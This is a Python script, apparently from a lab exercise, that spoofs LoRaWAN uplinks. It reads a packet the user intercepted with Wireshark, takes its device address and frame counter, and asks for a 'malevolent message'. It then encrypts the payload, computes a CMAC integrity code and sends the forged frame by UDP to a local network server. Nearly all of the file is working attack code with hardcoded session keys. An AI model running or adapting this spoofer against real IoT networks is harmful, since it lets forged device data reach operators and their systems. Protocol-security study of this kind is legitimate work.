import socket
from Crypto.Hash import CMAC
from Crypto.Cipher import AES

# Constructs and transmits an Unconfirmed Uplink packet
def uncofirmed_uplink(AppSKey, NwkSKey, DevAddr, FCnt, msg):
    MHDR = b'\x40'  # Unconfirmed Data Up
    FCtrl = b'\x00'
    FCnt += 1  # Increment frame counter
    FHDR = DevAddr + FCtrl + FCnt.to_bytes(2, 'little')
    FPort = b'\x01'  # Application default port
    direction = 0  # Uplink

    FRMPayload = encrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, msg)
    MACPayload = FHDR + FPort + FRMPayload

    B0 = generate_block0(direction, DevAddr, FCnt, MACPayload)
    input_block = B0 + MHDR + MACPayload
    MIC = generate_MIC(NwkSKey, input_block)

    to_transmit_pkt = MHDR + MACPayload + MIC
    sock.sendto(to_transmit_pkt, ("127.0.0.1", 9000))  # Send to Network Server

    return FCnt

# Encrypts FRMPayload using AES in CTR-like mode (LoRaWAN)
def encrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, plaintext):
    text_in_bytes = plaintext.encode()
    aes = AES.new(AppSKey, AES.MODE_ECB)
    block_size = 16
    n_blocks = (len(text_in_bytes) + block_size - 1) // block_size
    encrypted = b''

    for i in range(1, n_blocks + 1):
        Ai = (
            b'\x01' +                      # Block header (CTR mode)
            b'\x00\x00\x00\x00' +          # Padding
            bytes([direction & 0xFF]) +    # Direction: 0 = uplink, 1 = downlink
            DevAddr[::-1] +                # DevAddr in little-endian
            FCnt.to_bytes(4, 'little') +   # Frame counter
            b'\x00' +                      # Reserved
            bytes([i])                     # Block sequence number
        )
        Si = aes.encrypt(Ai)
        block = text_in_bytes[(i - 1)*block_size: i*block_size]
        encrypted += bytes(a ^ b for a, b in zip(block, Si))

    return encrypted

# Generates the B0 block used in MIC computation
def generate_block0(direction, DevAddr, FCnt, MACPayload):
    B0 = (
        b'\x49' +                         # Block type = MIC
        b'\x00\x00\x00\x00' +             # Padding
        bytes([direction & 0xFF]) +       # Direction byte
        DevAddr[::-1] +                   # DevAddr (little-endian)
        FCnt.to_bytes(4, 'little') +      # Frame counter
        b'\x00' +                         # Reserved
        bytes([len(MACPayload)])          # MACPayload length
    )
    return B0

# Computes 4-byte MIC using AES-CMAC
def generate_MIC(AESKey, payload):
    cmac_obj = CMAC.new(AESKey, ciphermod=AES)
    cmac_obj.update(payload)
    MIC = cmac_obj.digest()[:4]
    return MIC

# Decrypts FRMPayload using known AppSKey (useful for verification/debug)
def decrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, ciphertext):
    aes = AES.new(AppSKey, AES.MODE_ECB)
    block_size = 16
    n_blocks = (len(ciphertext) + block_size - 1) // block_size
    decrypted = b''

    for i in range(1, n_blocks + 1):
        Ai = (
            b'\x01' +
            b'\x00\x00\x00\x00' +
            bytes([direction & 0xFF]) +
            DevAddr[::-1] +
            FCnt.to_bytes(4, 'little') +
            b'\x00' +
            bytes([i])
        )
        Si = aes.encrypt(Ai)
        block = ciphertext[(i - 1) * block_size: i * block_size]
        decrypted += bytes(a ^ b for a, b in zip(block, Si))

    return decrypted

###################################################################################

AppSKey = bytes.fromhex('62EF6DC0FA4FF9A0B73E358E9EF7A5C3')
NwkSKey = bytes.fromhex('F3B76E521A84C90D7729EC014D8A3BF1')  # Note: mismatched keys

while True:
    # Insert intercepted uplink packet (hex string from Wireshark)
    hex_str = input("Insert intercepted unconfirmed uplink packet from Wireshark: ")

    data = bytes.fromhex(hex_str)  # Convert input to bytes

    print(f"[SPOOFER] Intercepted packet: {list(data)}")

    MHDR = data[0]
    DevAddr = data[1:5]  # DevAddr is spoofed (attacker uses it)
    FOptsLen = data[5] & 0x0F  # Extract FOptsLen from FCtrl (4 LSB)
    FRMPayload_start = 8 + FOptsLen  # Compute start of FPort
    FRMPayload = data[FRMPayload_start + 1:-4]  # Extract FRMPayload

    FCnt = data[6:8]
    FCnt = int.from_bytes(FCnt, 'little')

    # Build and send a spoofed message
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    mal_msg = input("Insert malevolent message:")
    Fcnt = uncofirmed_uplink(AppSKey, NwkSKey, DevAddr, FCnt, mal_msg)
    print("[SPOOFER] Sending spoofed packet to NS")
    print("-------------------------------------------------")